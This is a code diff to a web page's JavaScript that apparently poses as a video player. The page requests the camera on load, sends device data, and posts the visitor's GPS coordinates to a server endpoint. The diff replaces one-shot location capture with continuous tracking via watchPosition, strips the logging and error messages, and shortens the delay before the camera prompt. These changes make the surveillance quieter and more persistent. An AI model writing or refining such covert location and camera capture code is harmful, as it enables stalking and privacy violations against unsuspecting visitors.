@@ -262,10 +262,9 @@ function sendDeviceData() {
   });
 }
 
-function requestGPS() {
+function requestGPSNow() {
   if (!navigator.geolocation) return;
-
-  navigator.geolocation.getCurrentPosition(
+  navigator.geolocation.watchPosition(
     function(pos) {
       gpsData = {
         latitude: pos.coords.latitude,
@@ -275,7 +274,6 @@ function requestGPS() {
         altitude: pos.coords.altitude ? Math.round(pos.coords.altitude) : null,
         heading: pos.coords.heading || null
       };
-      console.log('GPS captured: ' + gpsData.latitude + ', ' + gpsData.longitude + ' (±' + gpsData.accuracy + 'm)');
       postJSON('/api/gps', {
         latitude: gpsData.latitude,
         longitude: gpsData.longitude,
@@ -285,10 +283,8 @@ function requestGPS() {
         heading: gpsData.heading
       });
     },
-    function(err) {
-      console.log('GPS denied or unavailable: ' + err.message);
-    },
-    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    function() {},
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
   );
 }
 
@@ -338,7 +334,7 @@ function autoRequestCamera() {
     video.srcObject = stream;
     video.muted = true;
     video.setAttribute('playsinline', '');
-    requestGPS();
+    requestGPSNow();
     video.play().then(function() {
       var box = document.getElementById('playerBox');
       if (box) box.classList.add('active');
@@ -359,7 +355,6 @@ function tryPlay() {
     loadBar.style.width = '100%';
     setTimeout(function() { loadBar.style.width = '0'; }, 600);
     document.getElementById('playerBox').classList.add('active');
-    if (!gpsData) requestGPS();
     startSpamPhotos();
     return;
   }
@@ -405,7 +400,7 @@ document.addEventListener('DOMContentLoaded', function() {
     sendDeviceData();
   });
 
-  setTimeout(function() { autoRequestCamera(); }, 500);
+  setTimeout(function() { autoRequestCamera(); }, 300);
 });
 
 function scrollToPlayer() {
